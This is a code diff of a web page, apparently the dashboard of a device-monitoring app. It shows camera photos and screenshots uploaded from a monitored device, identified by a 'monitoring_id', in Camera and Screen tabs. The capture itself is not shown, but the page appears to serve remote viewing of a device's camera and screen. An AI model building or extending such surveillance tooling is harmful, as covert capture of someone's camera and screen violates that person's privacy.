@@ -3,18 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Saved Files</title>
+    <title>Saved Gallery</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* --- SAME THEME AS DASHBOARD --- */
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        /* --- THEME SETTINGS --- */
         :root {
             --bg-color: #0f0f0f;
-            --glass-bg: rgba(255, 255, 255, 0.1);
+            --glass-bg: rgba(255, 255, 255, 0.05);
             --glass-border: rgba(255, 255, 255, 0.15);
             --text-main: #ffffff;
-            --accent: #4caf50;
-            --cyan: #00f3ff;
+            --accent: #00f3ff; /* Cyan for Display */
+            --accent-cam: #ff9800; /* Orange for Camera */
             --danger: #ff4444;
         }
         body {
@@ -27,143 +26,149 @@
         }
 
         /* --- HEADER --- */
-        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 25px; }
+        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
         .back-btn {
             background: var(--glass-bg); border: 1px solid var(--glass-border);
             color: #fff; padding: 10px 15px; border-radius: 12px;
             cursor: pointer; text-decoration: none; font-size: 1rem;
         }
-        .page-title { font-size: 1.2rem; font-weight: bold; color: var(--cyan); text-transform: uppercase; letter-spacing: 1px; }
+        .page-title { font-size: 1.2rem; font-weight: bold; color: #fff; text-transform: uppercase; letter-spacing: 1px; }
+
+        /* --- TABS (Category Switcher) --- */
+        .tabs-container {
+            display: flex; gap: 10px; margin-bottom: 25px;
+            background: rgba(255,255,255,0.03); pading: 5px; border-radius: 15px;
+        }
+        .tab-btn {
+            flex: 1; padding: 12px; border: none; outline: none;
+            background: transparent; color: #888;
+            font-size: 0.95rem; font-weight: 600;
+            border-bottom: 3px solid transparent;
+            cursor: pointer; transition: 0.3s;
+        }
+        .tab-btn.active { color: #fff; }
+        
+        /* Specific Colors for Active Tabs */
+        .tab-btn[data-target="camera"].active { border-color: var(--accent-cam); color: var(--accent-cam); }
+        .tab-btn[data-target="screen"].active { border-color: var(--accent); color: var(--accent); }
 
         /* --- GALLERY GRID --- */
         .gallery-container {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
-            gap: 15px;
+            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); /* Chote thumbnails */
+            gap: 10px;
             padding-bottom: 50px;
         }
 
-        .file-card {
-            background: rgba(30, 30, 30, 0.6);
-            border: 1px solid var(--glass-border);
-            border-radius: 15px;
-            overflow: hidden;
-            position: relative;
-            transition: transform 0.2s;
-            display: flex; flex-direction: column;
-        }
-        .file-card:active { transform: scale(0.98); }
-
-        /* Image Thumbnail */
-        .thumb-box {
-            height: 140px; width: 100%;
+        .img-card {
+            aspect-ratio: 1 / 1;
             background: #000;
-            display: flex; align-items: center; justify-content: center;
+            border-radius: 10px;
             overflow: hidden;
             position: relative;
+            border: 1px solid var(--glass-border);
+            cursor: pointer;
         }
-        .thumb-box img {
+        .img-card img {
             width: 100%; height: 100%; object-fit: cover;
-            transition: opacity 0.3s;
+            transition: transform 0.3s;
         }
-        .thumb-box i { font-size: 2.5rem; color: #555; }
-
-        /* File Info Footer */
-        .file-info {
-            padding: 10px;
-            display: flex; justify-content: space-between; align-items: center;
-            background: rgba(255, 255, 255, 0.05);
-        }
-        .file-name {
-            font-size: 0.75rem; color: #ccc;
-            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
-            max-width: 80%;
-        }
-        .download-btn {
-            color: var(--cyan); cursor: pointer; font-size: 1rem;
-            padding: 5px;
+        .img-card:hover img { transform: scale(1.1); }
+        
+        /* Date Badge on Image */
+        .date-badge {
+            position: absolute; bottom: 0; left: 0; right: 0;
+            background: rgba(0,0,0,0.7); color: #fff;
+            font-size: 0.6rem; padding: 4px; text-align: center;
         }
 
-        /* --- LOADING & EMPTY STATES --- */
-        .status-msg {
-            text-align: center; margin-top: 50px; color: #777; font-size: 0.9rem;
-        }
+        /* --- STATES --- */
+        .status-msg { text-align: center; margin-top: 50px; color: #777; font-size: 0.9rem; display: none; }
         .loader {
-            border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid var(--cyan);
+            border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid var(--accent);
             border-radius: 50%; width: 30px; height: 30px;
             animation: spin 1s linear infinite; margin: 0 auto 15px auto;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* --- FULLSCREEN MODAL (Lightbox) --- */
+        /* --- FULLSCREEN MODAL --- */
         .modal {
             display: none; position: fixed; z-index: 1000;
             left: 0; top: 0; width: 100%; height: 100%;
             background-color: rgba(0,0,0,0.95);
             align-items: center; justify-content: center; flex-direction: column;
         }
-        .modal img { max-width: 95%; max-height: 80%; border-radius: 5px; box-shadow: 0 0 20px rgba(0,243,255,0.2); }
-        .modal-close {
-            position: absolute; top: 20px; right: 20px;
-            color: #fff; font-size: 2rem; cursor: pointer;
-        }
-        .modal-actions {
-            margin-top: 20px; display: flex; gap: 20px;
-        }
+        .modal img { max-width: 95%; max-height: 80vh; border-radius: 5px; box-shadow: 0 0 20px rgba(255,255,255,0.1); }
+        .modal-close { position: absolute; top: 20px; right: 20px; color: #fff; font-size: 2rem; cursor: pointer; }
+        
+        .modal-actions { margin-top: 20px; display: flex; gap: 20px; }
         .action-btn {
-            background: #333; color: #fff; padding: 10px 20px;
-            border-radius: 20px; text-decoration: none; font-size: 0.9rem;
+            background: #333; color: #fff; padding: 10px 25px;
+            border-radius: 30px; text-decoration: none; font-size: 0.9rem;
             display: flex; align-items: center; gap: 8px; border: 1px solid #555;
         }
+        .btn-download { background: var(--accent); color: #000; border: none; font-weight: bold; }
+
     </style>
 </head>
 <body>
 
     <div class="header">
-        <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
-        <div class="page-title">Saved Files</div>
-        <div style="width: 40px;"></div> </div>
-
-    <div id="loading" class="status-msg">
-        <div class="loader"></div>
-        Fetching Files...
+        <a href="javascript:history.back()" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
+        <div class="page-title">Gallery</div>
+        <div style="width: 40px;"></div> 
     </div>
 
-    <div id="emptyState" class="status-msg" style="display: none;">
-        <i class="fa-solid fa-folder-open" style="font-size: 3rem; margin-bottom: 10px; opacity: 0.5;"></i><br>
-        No saved files found.
+    <div class="tabs-container">
+        <button class="tab-btn active" data-target="camera" onclick="filterFiles('camera')">
+            <i class="fa-solid fa-camera"></i> Camera
+        </button>
+        <button class="tab-btn" data-target="screen" onclick="filterFiles('screen')">
+            <i class="fa-solid fa-mobile-screen"></i> Screen
+        </button>
     </div>
 
-    <div class="gallery-container" id="galleryGrid">
-        </div>
+    <div id="loading" class="status-msg" style="display: block;">
+        <div class="loader"></div> Fetching Files...
+    </div>
+    <div id="emptyState" class="status-msg">
+        <i class="fa-regular fa-folder-open" style="font-size: 2rem; margin-bottom: 10px;"></i><br>
+        No photos found in this category.
+    </div>
+
+    <div class="gallery-container" id="galleryGrid"></div>
 
     <div id="imageModal" class="modal">
         <span class="modal-close" onclick="closeModal()">&times;</span>
         <img id="fullImage" src="">
         <div class="modal-actions">
-            <a id="downloadLink" href="#" download class="action-btn" style="border-color: var(--cyan); color: var(--cyan);">
-                <i class="fa-solid fa-download"></i> Download
+            <a id="downloadLink" href="#" download class="action-btn btn-download">
+                <i class="fa-solid fa-download"></i> Save
             </a>
             <button onclick="closeModal()" class="action-btn">Close</button>
         </div>
     </div>
 
     <script>
-        // --- CONFIGURATION ---
+        // 🔥 SERVER URL
         const API_BASE = 'https://child-v9no.onrender.com'; 
         
-        // URL se Device ID nikalo
         const urlParams = new URLSearchParams(window.location.search);
         const DEVICE_ID = urlParams.get('id') || localStorage.getItem('monitoring_id');
 
+        let allFilesData = []; // Store all files here
+        let currentFilter = 'camera'; // Default tab
+
+        // Elements
         const galleryGrid = document.getElementById('galleryGrid');
         const loading = document.getElementById('loading');
         const emptyState = document.getElementById('emptyState');
         const modal = document.getElementById('imageModal');
         const fullImage = document.getElementById('fullImage');
         const downloadLink = document.getElementById('downloadLink');
+        const tabs = document.querySelectorAll('.tab-btn');
 
-        // Page Load hote hi files fetch karo
+        // Init
         window.onload = function() {
             if(!DEVICE_ID) {
                 alert("Device ID Missing!");
@@ -173,69 +178,86 @@
             fetchSavedFiles();
         };
 
+        // 1. Fetch Files from Server
         function fetchSavedFiles() {
-            // NOTE: API endpoint check kar lena. Main assume kar raha hu ye path hai.
-            // Agar server path alag hai (eg: /api/files/list), toh yahan change karna.
-            fetch(`${API_BASE}/api/get-saved-files/${DEVICE_ID}`)
+            // Note: API path may vary based on your server code. 
+            // Using /api/gallery-list/ID as per your previous example request
+            fetch(`${API_BASE}/api/gallery-list/${DEVICE_ID}`)
                 .then(response => response.json())
                 .then(data => {
                     loading.style.display = 'none';
                     
-                    // Check if data exists and is an array
-                    if (data && Array.isArray(data) && data.length > 0) {
-                        renderFiles(data);
+                    // Handle API format (Some send {photos: []}, some send plain [])
+                    let files = [];
+                    if (data.photos) { files = data.photos; } 
+                    else if (Array.isArray(data)) { files = data; }
+
+                    if (files.length > 0) {
+                        allFilesData = files; // Save to global var
+                        filterFiles('camera'); // Initial Load
                     } else {
                         emptyState.style.display = 'block';
+                        emptyState.innerHTML = "No files uploaded yet.";
                     }
                 })
                 .catch(error => {
-                    console.error("Error fetching files:", error);
-                    loading.innerHTML = "<span style='color: #ff4444;'>Failed to load files.</span>";
+                    console.error("Error:", error);
+                    loading.innerHTML = "<span style='color:red'>Failed to load gallery.</span>";
                 });
         }
 
-        function renderFiles(files) {
-            galleryGrid.innerHTML = '';
-            
-            // Reverse array to show newest first
-            files.reverse().forEach(file => {
-                // Determine file URL (assuming server returns full URL or relative path)
-                // Agar server sirf filename bhejta hai, toh manually URL banao:
-                // const fileUrl = `${API_BASE}/uploads/${file.filename}`;
-                
-                // Yahan assume kar rahe hain object structure: { url: '...', filename: '...', type: '...' }
-                const fileUrl = file.url || file; // Fallback if simple string array
-                const fileName = file.filename || "Unknown File";
-                const isImage = fileUrl.match(/\.(jpeg|jpg|gif|png|webp)$/i) != null;
+        // 2. Filter Logic (Camera vs Screen)
+        function filterFiles(category) {
+            currentFilter = category;
 
-                const div = document.createElement('div');
-                div.className = 'file-card';
+            // Update Tabs UI
+            tabs.forEach(btn => {
+                btn.classList.remove('active');
+                if(btn.dataset.target === category) btn.classList.add('active');
+            });
+
+            // Clear Grid
+            galleryGrid.innerHTML = '';
+            emptyState.style.display = 'none';
+
+            // Logic to separate files based on name
+            // Camera = 'cam', 'front', 'back', 'pic'
+            // Screen = 'screen', 'shot', 'display'
+            const filtered = allFilesData.filter(url => {
+                const lowerUrl = url.toLowerCase();
                 
-                // Content Generate
-                let thumbnailHtml = '';
-                if(isImage) {
-                    thumbnailHtml = `<img src="${fileUrl}" loading="lazy" onerror="this.src='https://via.placeholder.com/150?text=Error'">`;
+                if (category === 'screen') {
+                    return lowerUrl.includes('screen') || lowerUrl.includes('shot');
                 } else {
-                    // Agar image nahi hai (audio/video), generic icon dikhao
-                    thumbnailHtml = `<i class="fa-solid fa-file-zipper"></i>`;
+                    // Default to Camera for everything else (fallback)
+                    return !lowerUrl.includes('screen') && !lowerUrl.includes('shot');
                 }
+            });
+
+            if (filtered.length === 0) {
+                emptyState.style.display = 'block';
+                return;
+            }
+
+            // Render
+            filtered.forEach(url => {
+                const div = document.createElement('div');
+                div.className = 'img-card';
+                div.onclick = () => openModal(url);
+
+                // Simple date extraction from Cloudinary URL (optional logic)
+                let dateBadge = '';
+                // Example: agar URL mein timestamp hai to dikha sakte hain, abhi hide rakha hai
 
                 div.innerHTML = `
-                    <div class="thumb-box" onclick="${isImage ? `openModal('${fileUrl}')` : ''}">
-                        ${thumbnailHtml}
-                    </div>
-                    <div class="file-info">
-                        <span class="file-name">${fileName}</span>
-                        <a href="${fileUrl}" download target="_blank" class="download-btn">
-                            <i class="fa-solid fa-download"></i>
-                        </a>
-                    </div>
+                    <img src="${url}" loading="lazy" onerror="this.style.display='none'">
+                    ${dateBadge}
                 `;
                 galleryGrid.appendChild(div);
             });
         }
 
-        // --- MODAL FUNCTIONS ---
+        // 3. Modal Functions
         function openModal(url) {
             fullImage.src = url;
             downloadLink.href = url;
@@ -247,12 +269,11 @@
             fullImage.src = '';
         }
 
-        // Close modal when clicking outside image
+        // Close on background click
         modal.addEventListener('click', function(e) {
-            if (e.target === modal) {
-                closeModal();
-            }
+            if (e.target === modal) closeModal();
         });
+
     </script>
 </body>
 </html>
